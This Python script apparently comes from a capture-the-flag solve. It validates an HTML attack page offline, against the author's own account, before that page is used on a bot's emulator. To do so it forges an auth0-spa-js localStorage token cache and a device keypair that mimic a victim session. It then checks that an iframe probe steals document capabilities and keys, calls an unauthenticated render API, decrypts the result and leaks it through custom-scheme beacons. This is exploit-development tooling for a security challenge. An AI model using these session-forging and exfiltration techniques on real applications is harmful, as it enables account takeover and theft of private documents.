#!/usr/bin/env python3
"""
Offline validation of the SHIPPING page, solve/payload.html.

localval.py validates frameread.html, which solve.py uses. shot.py ships
payload.html instead, and payload.html is what goes to the emulator, so it needs
its own validator or a syntax error burns a session.

Proves, against our own account only and with no emulator:
  1. payload.html parses and boots on the content origin,
  2. the `arix://` beacon navigation does NOT unload our document. Desktop Chrome
     has no handler for the scheme, so the navigation is refused and we stay put,
     which is the same disposition an Android Chrome gives an intent it can't
     match. If this were wrong the page would die after its first beacon.
  3. the iframe probe recovers cap+key for a document the signed-in session owns,
     POSTs /api/render unauthenticated and AES-GCM decrypts it,
  4. NEGATIVE CONTROL: a well-formed id owned by nobody comes back `miss`
     with loads=1, which is what a wrong candidate looks like on the emulator.

Run:  $HOME/ctf-tools/venv/bin/python payval.py
"""

import base64
import json
import os
import re
import secrets
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import ari
import docs
import shot

CHROME = os.path.expanduser("~/ctf-tools/chrome/chrome")
APP = "https://ariadnetab.xyz"


def jwt_claims(token):
    """Claims out of a JWT with no verification. Local harness use only."""
    try:
        payload = token.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception:
        return {}


def auth0_cache_entries(token, scope, id_token):
    """auth0-spa-js v2 localStorage cache, reproduced from a real login.

    Shape confirmed by solve/authdump.py against the live tenant, after two
    wrong guesses. TWO entries are required, not one:

      @@auth0spajs@@::<clientId>::<audience>::<scope>   the access-token entry,
          wrapped as {body: {...}, expiresAt: <unix>}. The scope segment is the
          GRANTED scope, `openid profile email`.
      @@auth0spajs@@::<clientId>::@@user@@              the id-token entry,
          NOT wrapped in `body`, just {id_token, decodedToken}.

    The second one is the part that cost a run. `_getEntryFromCache` ends with
    `return user && {...}`, where `user` comes from `_getIdTokenFromCache()`. So
    with the access-token entry present but no @@user@@ entry it returns
    undefined, getTokenSilently falls through to a network silent auth, and on a
    browser with no Auth0 SSO cookie that fails with `Login required`.

    There's no key manifest on this tenant; a real login writes exactly these
    two keys plus the two rsa* items.
    """
    claims = jwt_claims(id_token)
    user = {k: claims[k] for k in
            ("nickname", "name", "picture", "updated_at", "email",
             "email_verified", "sub") if k in claims}
    return [
        ["@@auth0spajs@@::%s::%s::%s" % (ari.CLIENT_ID, ari.AUDIENCE, scope),
         json.dumps({
             "body": {
                 "access_token": token,
                 "scope": scope,
                 "expires_in": 3600,
                 "token_type": "Bearer",
                 "audience": ari.AUDIENCE,
                 "oauthTokenScope": scope,
                 "client_id": ari.CLIENT_ID,
             },
             "expiresAt": int(time.time()) + 3000,
         })],
        ["@@auth0spajs@@::%s::@@user@@" % ari.CLIENT_ID,
         json.dumps({"id_token": id_token,
                     "decodedToken": {"claims": claims, "user": user}})],
    ]


def render(token, tag, targets, lanes, deadline):
    html = open(os.path.join(HERE, "payload.html")).read()
    html = (html
            .replace("@@TOKEN@@", token)
            .replace("@@TAG@@", tag)
            .replace("@@TARGETS@@", json.dumps(targets))
            .replace("@@LANES@@", str(lanes))
            .replace("@@DEADLINE@@", str(deadline)))
    leftover = re.findall(r"@@\w+@@", html)
    if leftover:
        raise SystemExit("unsubstituted markers: %s" % leftover)
    return html


def main():
    state = ari.load_state()
    print("[*] minting a fresh access token")
    grant = ari.get_token(state["email"], state["password"])
    token = grant["access_token"]
    id_token = grant.get("id_token", "")
    token_scope = grant.get("scope") or "openid profile email"
    print("    -> scope %r" % token_scope)
    state["access_token"] = token
    ari.save_state(state)
    keys = docs.ensure_keys(state)

    marker = "PAYVAL-TARGET-" + secrets.token_hex(6)
    print("[*] uploading target document, marker %s" % marker)
    target, _ = docs.upload(state, "payval-target.txt", "text/plain", marker.encode())
    target_id = target["id"]

    # A syntactically valid id that no account owns. It must LOOK exactly like a
    # candidate so the miss path we measure is the miss path the shot will hit.
    control_id = "00000000-0000-4000-8000-" + secrets.token_hex(6)
    tag = "pv" + secrets.token_hex(2)
    print("[*] target %s  control %s  tag %s" % (target_id, control_id, tag))

    html = render(token, tag, [target_id, control_id], lanes=2, deadline=20000)
    page, _ = docs.upload(state, "payval-%s.html" % tag, "text/html", html.encode())
    viewer = docs.viewer_url(state, page["id"])
    print("[*] viewer %s..." % viewer[:70])

    from playwright.sync_api import sync_playwright

    with sync_playwright() as pw:
        browser = pw.chromium.launch(executable_path=CHROME, headless=True,
                                     args=["--no-sandbox", "--disable-dev-shm-usage"])
        ctx = browser.new_context()
        page_obj = ctx.new_page()

        beacons = []
        page_obj.on("console", lambda m: beacons.append(m.text))

        # Seed the browser to look like the bot's: a device keypair in app-origin
        # localStorage plus a live auth0-spa-js token cache entry. All app.js
        # needs is a cached bearer and a stored keypair.
        # PAYVAL_NO_KEYPAIR=1 seeds the bearer but not the keypair, which
        # reproduces the one emulator failure we can't tell apart from a wrong
        # candidate id: loadEncodedKeys() rethrows the 8 s timeout and start()
        # aborts before documents/open runs.
        no_keypair = os.environ.get("PAYVAL_NO_KEYPAIR") == "1"
        print("[*] seeding %s into localStorage"
              % ("auth0 cache ONLY (no device keypair)" if no_keypair
                 else "device keypair + auth0-spa-js cache"))
        page_obj.goto(APP + "/", wait_until="domcontentloaded")
        page_obj.evaluate(
            "([priv, pub, entries, skip]) => {"
            "  if (!skip) { localStorage.setItem('rsaPrivateKeyPkcs8', priv);"
            "               localStorage.setItem('rsaPublicKeySpki', pub); }"
            "  for (const [k, v] of entries) localStorage.setItem(k, v);"
            "}",
            [keys["privateKey"], keys["publicKey"],
             auth0_cache_entries(token, token_scope, id_token), no_keypair],
        )
        seeded = page_obj.evaluate("() => Object.keys(localStorage)")
        print("    -> localStorage keys: %s" % seeded)

        print("[*] loading payload.html on the content origin")
        page_obj.goto(viewer, wait_until="domcontentloaded")
        deadline = time.time() + 150
        last = ""
        while time.time() < deadline:
            page_obj.wait_for_timeout(1000)
            try:
                text = page_obj.inner_text("#log")
            except Exception:
                text = last
            if text != last:
                new = text.split("\n")[len(last.split("\n")) if last else 0:]
                for line in new:
                    print("    " + line)
                last = text
            if "DONE hits=" in text:
                break

        # Did the document survive its own beacons?  If location.href to an
        # unhandled scheme had unloaded us, the log would stop at the boot line.
        survived = page_obj.evaluate("() => location.href").startswith("https://content.")
        browser.close()

    print("\n===== verdict =====")
    hit = marker in last
    miss = re.search(r"miss " + re.escape(control_id) + r" loads=(\d+)", last)
    print("positive control (own document decrypted): %s" % ("PASS" if hit else "FAIL"))
    print("negative control (unowned id misses)     : %s%s"
          % ("PASS" if miss else "FAIL",
             " loads=%s" % miss.group(1) if miss else ""))
    print("page survived its own arix:// beacons    : %s" % ("PASS" if survived else "FAIL"))
    beacon_lines = [b for b in beacons if "arix" in b]
    print("beacon navigations refused by desktop chrome: %d observed" % len(beacon_lines))
    if beacon_lines:
        print("  e.g. %s" % beacon_lines[0][:160])
    ok = hit and miss and survived
    print("\n[+] PAYLOAD VALIDATED" if ok else "\n[-] payload NOT validated")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
